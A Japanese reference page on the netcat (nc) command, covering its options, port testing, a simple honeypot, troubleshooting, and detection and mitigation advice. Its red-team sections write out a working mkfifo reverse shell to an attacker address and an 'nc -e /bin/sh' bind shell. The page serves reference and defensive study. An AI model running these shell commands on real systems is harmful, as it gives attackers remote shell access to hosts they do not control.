# `nc` (netcat) - ネットワークの読み書き万能ツール

## 概要

`nc` (netcat) は、TCPやUDPプロトコルを使ってネットワーク接続の読み書きを行う、非常に多機能なコマンドラインユーティリティです。そのシンプルさと柔軟性から「**ネットワークの万能ナイフ（スイスアーミーナイフ）**」と称されます。単にポートに接続するだけでなく、リスニングサーバーとして動作させたり、ファイルを転送したり、ポートスキャンを行ったりと様々な用途に利用できます。

(出自: `netcat-openbsd`, `nmap-ncat` などのパッケージに含まれる)

## 類似コマンドと差異

| 類似コマンド | 差異 / 使い分けのポイント | 推奨 |
| :--- | :--- | :--- |
| **`telnet`** | `telnet` もポート接続テストに使えますが、`nc` はサーバーとして動作 (`-l`) したり、UDPを使ったりと、遥かに多機能です。 | `nc` |
| **`socat`** | `nc` のスーパーセットとも言える、より高機能なリレーツール。SSL/TLS暗号化など高度な機能を持ちます。`nc` はよりシンプルで普遍性が強みです。 | `socat` (高機能) |
| **`curl` / `wget`** | これらはHTTP/HTTPSなどアプリケーション層のプロトコルを扱います。`nc` は、より低レベルなTCP/UDP層で、生のデータを送受信します。 | - |

## よく連携されるコマンド

`nc` は、シェルと連携してリバースシェルやバインドシェルを作成する際に、その真価を発揮します。

### シナリオ例: リバースシェルを確立する (レッドチーム視点)

* **目的**: 標的サーバーのシェルを、ファイアウォールを通過しやすいアウトバウンド接続を利用して奪取する。
* **連携コマンド**: `bash` (または `sh`), `mkfifo`
* **解説**: 攻撃者のマシンで `nc` をリスニングモードで待ち受けさせ、標的サーバー側で脆弱性を突いて実行させたコマンドから、攻撃者のマシンへシェルの入出力を接続させます。
* **コマンド例**:

    ```bash
    # 攻撃者のマシン (10.0.0.5) で実行
    # 4444番ポートで接続を待ち受ける
    nc -lvnp 4444

    # 標的のマシンで実行 (モダンな -e なし版)
    # 攻撃者のマシンにbashのシェルを接続する
    rm /tmp/f; mkfifo /tmp/f
    cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.5 4444 > /tmp/f
    ```

## オプション説明

| オプション | 説明 |
| :--- | :--- |
| **動作モード** | |
| ⭐ `-l` | **リッスンモード**。指定したポートで接続を待ち受けるサーバーとして動作します。 |
| ⭐ `-p <port>` | リッスンするポート番号、または送信元ポート番号を指定します。 |
| ⭐ `-z` | **ゼロI/Oモード**。データを送受信せず、接続の成功/失敗のみを報告します。ポートスキャンに使用します。 |
| `-u` | プロトコルとして**UDP**を使用します。 |
| **出力制御** | |
| ⭐ `-v`, `-vv` | 詳細な情報を表示します。`-v` は接続状況、`-vv` はさらに詳細な情報を表示します。 |
| `-n` | IPアドレスの名前解決（DNSルックアップ）を行いません。実行が高速になります。 |
| **その他** | |
| `-w <sec>` | タイムアウト時間を秒数で指定します。 |
| `-e <program>` | (危険/旧式) 接続確立後にプログラムを実行します。**多くのモダンな `nc` では削除されています**。 |

## よく使われるオプション組み合わせと業務シナリオ

### 1. インフラ構築・運用視点

* **タスク**: ファイアウォール設定後、ポートの接続性をテストする。
* **組み合わせ**: `nc -zv <host> <port>`
* **解説**: `-z` (ゼロI/O) と `-v` (詳細表示) を使い、特定のホストのポートに接続できるかを素早くテストします。
* **例**:

    ```bash
    # database-server.internal のポート1521が開いているかテスト
    nc -zv database-server.internal 1521
    # -> Connection to database-server.internal port 1521 [tcp/oracle] succeeded!
    ```

### 2. ブルーチーム視点

* **タスク**: マルウェアが送信するデータを観測するための簡易的なハニーポットを立てる。
* **組み合わせ**: `sudo nc -l -p <port>`
* **解説**: マルウェアが特定のポートで外部と通信することが判明した場合、DNSを偽装して接続先をローカルに向けさせた上で `nc` で待ち受け、マルウェアがどのようなデータを送信しようとするのかを直接受信・観測します。
* **例**:

    ```bash
    # ポート8080で待ち受け、受信したデータを hexdump で表示
    sudo nc -l -p 8080 | xxd
    ```

### 3. レッドチーム視点

* **タスク**: 標的サーバーのシェルを奪取する。
* **組み合わせ**: リバースシェル / バインドシェル
* **解説**: 上記「よく連携されるコマンド」のシナリオ例を参照。`nc` は、システム侵入後のシェルアクセスを確立するための最も古典的で強力なツールの1つです。
* **例**: (バインドシェル - 旧式の `-e` が使える場合)

    ```bash
    # 標的サーバーで実行: 4444番ポートでシェルを待ち受けさせる
    nc -lvnp 4444 -e /bin/sh
    ```

## エラーメッセージとトラブルシューティング

* 一般的なエラーは [Linux共通のトラブルシューティング](./troubleshooting_common_errors.md) を参照。

1. **エラーメッセージ例 1**: `(UNKNOWN) [...] : Connection refused`
    * **考えられる原因**: ネットワークは到達可能ですが、宛先ホストの指定ポートでリッスンしているプロセスが存在しません。
    * **解決策**: 宛先ホストでサービスが正しく起動しているか、ポート番号が正しいかを確認してください。

2. **エラーメッセージ例 2**: `nc: invalid option -- 'e'`
    * **考えられる原因**: 使用している `nc` のバージョンでは、セキュリティ上の懸念から `-e` オプションがコンパイル時に無効化されています。
    * **解決策**: 名前付きパイプ (`mkfifo`) を使った代替手法（上記シナリオ例を参照）を利用する必要があります。

## 環境変数と設定ファイル

* `nc` の動作に直接影響する環境変数や設定ファイルは通常ありません。
* 一般的な環境変数・設定ファイルは [Linux共通の環境変数・設定ファイル](./environment_and_config.md) を参照。

## セキュリティに関する考慮事項

### 脆弱性と悪用事例

* **脆弱性**: **通信は平文**。`nc` で送受信されるデータは一切暗号化されません。
* **悪用シナリオ**: `nc` は、環境寄生型バイナリ (LOLBAS) の代表格です。攻撃者はシステム侵入後、ほぼ確実に `nc` が存在するかを確認し、リバースシェルやバインドシェルを確立するための主要なツールとして利用します。

### GTFOBins / LOLBAS における利用例

* **機能**: **Bind Shell**, **Reverse Shell**, File Transfer, Port Scanning
* **参照**: `https://gtfobins.github.io/gtfobins/nc/`

### 対応策・緩和策 (ブルーチーム視点)

* **Prevention (予防)**: Egress（外部への送信）トラフィックをファイアウォールで厳格に制御し、不要なアウトバウンド接続を許可しない。AppLockerなどで `nc.exe` の実行を制限する。
* **Detection (検知)**: `nc` プロセスから `/bin/sh` などのシェルが起動されていないか、あるいは外部への予期せぬTCP/UDP接続がないかをEDRや`auditd`で監視する。

## 注意点・補足

* **実装の差異**: `nc` にはOpenBSD版やNmapプロジェクトの `ncat` など、複数の実装が存在します。オプションの有無や挙動が微妙に異なることがあるため、`nc -h` で利用可能なオプションを確認することが推奨されます。
